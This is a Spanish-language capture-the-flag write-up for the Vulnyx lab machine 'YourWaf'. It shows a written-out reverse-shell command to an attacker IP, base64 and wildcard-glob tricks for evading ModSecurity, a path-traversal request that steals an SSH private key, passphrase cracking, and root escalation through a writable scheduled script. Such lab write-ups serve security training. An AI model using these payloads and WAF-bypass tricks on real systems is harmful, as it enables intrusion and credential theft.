---
author: Lenam
pubDatetime: 2024-05-26T15:22:00Z
title: WriteUp YourWaf - Vulnyx
slug: yourwaf-writeup-vulnyx-es
featured: false
draft: false
ogImage: "assets/yourwaf/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - WAF
  - RCE
  - CRON 
description:
  Intenté crear un CTF para practicar la evasión del WAF de Apache ModSecurity.
lang: es
---

La máquina tiene dos banderas, una para el usuario y otra para root.

![img_p0_1](/assets/yourwaf/img_p0_1.png)

Intenté crear un CTF para practicar la evasión del WAF de Apache ModSecurity.

Espero que lo disfrutes.

## Tabla de contenido

## Enumeración, Puertos y Servicios

`$ nmap -p- 192.168.1.195 -oN nmap.txt -vvv`

![img_p1_1](/assets/yourwaf/img_p1_1.png)

Encontramos 3 puertos abiertos: 22, 80, 3000 (SSH, HTTP, y ¿ppp?). Examinamos más de cerca los tres puertos para intentar obtener más información.

`$ nmap -sV -sC -A -p 80,22 192.168.1.195 -oN nmap2.txt -vvv`

![img_p1_2](/assets/yourwaf/img_p1_2.png)

El puerto 3000 parece ser una aplicación Node.js con Express.

Intento acceder al sitio web en el puerto 80, redirigiendo al dominio www.yourwaf.nyx, lo añado al archivo /etc/hosts y recargo la dirección en el navegador, esta vez a través del dominio.

![img_p1_3](/assets/yourwaf/img_p1_3.png)

Aparece un sitio web con información sobre ModSecurity.

![img_p2_1](/assets/yourwaf/img_p2_1.png)

Cuando uso la herramienta whatweb, parece ser detectada por el WAF, pero cuando agrego un "User-Agent" diferente, parece obtener los resultados:

![img_p2_2](/assets/yourwaf/img_p2_2.png)

Existen herramientas como whatwaf, pero no lo veo necesario ya que el sitio web muestra información sobre ModSecurity.

[](https://github.com/Ekultek/WhatWaf)[https://github.com/Ekultek/WhatWaf](https://github.com/Ekultek/WhatWaf)

Realizamos una enumeración de directorios y archivos en el sitio web, pero no encontramos nada interesante.

Vemos que encontramos el puerto 3000 y devuelve el mensaje "Unauthorized", así que realizamos una enumeración de directorios en este puerto.

![img_p2_3](/assets/yourwaf/img_p2_3.png)

![img_p2_4](/assets/yourwaf/img_p2_4.png)

Encontramos varias direcciones en el puerto 3000, pero la única que nos muestra información es la ruta http://www.yourwaf.nyx:3000/logs.

Esta dirección parece mostrar información del registro de Apache ModSecurity. Puedes ver todas las veces que nuestras "enumeraciones" han fallado.

![img_p3_1](/assets/yourwaf/img_p3_1.png)

Dado que tenemos un dominio, intentamos verificar si hay subdominios o hosts virtuales con otros dominios configurados, agregamos un "User-Agent" al escáner para evitar el WAF en el servidor:

![img_p3_2](/assets/yourwaf/img_p3_2.png)

Encontramos otro subdominio maintenance.yourwaf.nyx, añadimos el subdominio a /etc/hosts, y abrimos el navegador para ver qué encontramos.

![img_p3_3](/assets/yourwaf/img_p3_3.png)

Encontramos una magnífica ejecución de comandos para el mantenimiento del servidor:

Está protegida por el WAF ModSecurity, pero podemos intentar los siguientes ejemplos.

![img_p4_1](/assets/yourwaf/img_p4_1.png)

## Intrusión

Si ingresamos `ls`:

![img_p5_1](/assets/yourwaf/img_p5_1.png)

Si ingresamos `cat index.php`:

![img_p5_2](/assets/yourwaf/img_p5_2.png)

Intentamos usar caracteres comodín:
`/bin/cat index.php`

Intentamos algo con:

`/?i?/c?t index.php`

Pero devuelve un error:

![img_p5_3](/assets/yourwaf/img_p5_3.png)

Intentamos lo mismo, pero también codificamos la salida en base64:

`/?i?/c?t index.php | base64`

Esta vez obtenemos un texto en base64:

![img_p6_1](/assets/yourwaf/img_p6_1.png)

Al convertirlo a texto plano, finalmente obtenemos el código fuente de index.php después de mucho texto incomprensible de posibles comandos ejecutados:

![img_p6_2](/assets/yourwaf/img_p6_2.png)

Como puedes ver, el código no tiene validación, así que intentamos crear un revshell que ModSecurity pueda "tragar":

Creamos un simple revshell y lo codificamos en base64:

`sh -i >& /dev/tcp/192.168.1.116/433 0>&1`

En base64:

`c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ==`

La idea es ejecutar:

`/bin/echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ== | base64 -d | /bin/bash -e`

Si lo ejecutamos tal cual, nos mostrará un "Forbidden", pero si lo transformamos con caracteres comodín "?", por ejemplo:

`/???/e??o c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExNi80MzMgMD4mMQ== | base64 -d | /???/b??h -e`

Obtenemos un revshell con el usuario www-data.

## Movimiento Lateral a tester

Ahora podemos enumerar los usuarios del sistema

![img_p8_1](/assets/yourwaf/img_p8_1.png)

Vemos un usuario: tester.

¿A qué grupos pertenece www-data?

![img_p8_2](/assets/yourwaf/img_p8_2.png)

Tanto en `/var/www/www.yourwaf.nyx` como en `/var/www/maintenance.yourwaf.nyx`, no encontramos nada interesante, y el usuario www-data no tiene permisos para modificar nada aquí.

Pero encontramos algo interesante en la carpeta `/opt/nodeapp`, que parece ser la aplicación mostrada en el puerto 3000. Examinamos el código de la aplicación:

`www-data@yourwaf:/opt/nodeapp$ cat /opt/nodeapp/server.js`

Como se ve en la imagen a continuación, puedes pasar un parámetro con el token que aparece en el código para llamar a los endpoints privados de la API en el puerto 3000. Esto nos permite ejecutar el endpoint /readfile para leer archivos con este servicio que corre con el usuario root.

Tenemos que tener cuidado con el endpoint "/restart" ya que reiniciará el servidor.

![img_p9_1](/assets/yourwaf/img_p9_1.png)

Usando los datos obtenidos de la API programada en node.js, intentamos obtener las banderas, pero no lo logramos. Sin embargo, sí conseguimos obtener el id_rsa de tester:

`curl -o id_rsa 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'`

Obtenemos el id_rsa de tester:

![img_p10_1](/assets/yourwaf/img_p10_1.png)

Intentamos usar el id_rsa para iniciar sesión vía ssh con el usuario tester, pero está protegido con una frase de contraseña. Intentamos descifrarla con rockyou.txt.

![img_p10_3](/assets/yourwaf/img_p10_3.png)

![img_p10_2](/assets/yourwaf/img_p10_2.png)

Después de un rato, no más de 5 minutos, encontramos la frase de contraseña del id_rsa.

![img_p10_4](/assets/yourwaf/img_p10_4.png)

## Escalada de Privilegios de tester a root

Nos conectamos vía SSH con la clave id_rsa y la frase de contraseña.

![img_p11_1](/assets/yourwaf/img_p11_1.png)

Vemos que el usuario pertenece al grupo copylogs. Revisamos todos los archivos que podemos escribir con el usuario copylogs.

![img_p11_2](/assets/yourwaf/img_p11_2.png)

Encuentro un archivo que tiene permisos de escritura dentro de la carpeta de la aplicación node.js.

Vemos un archivo llamado ecosystem.config.js que pertenece a la aplicación PM2, un creador de demonios para aplicaciones node.js, y vemos que está instalado.

![img_p11_3](/assets/yourwaf/img_p11_3.png)

Como se puede ver en el archivo, el script copylogs.sh se ejecuta cada 10 segundos.

Más información: https://pm2.keymetrics.io/

Modificamos el archivo copylogs.sh insertando un revshell y comenzamos a escuchar.

![img_p12_1](/assets/yourwaf/img_p

12_1.png)

Accedemos como root y ahora podemos ver el archivo de la bandera root.

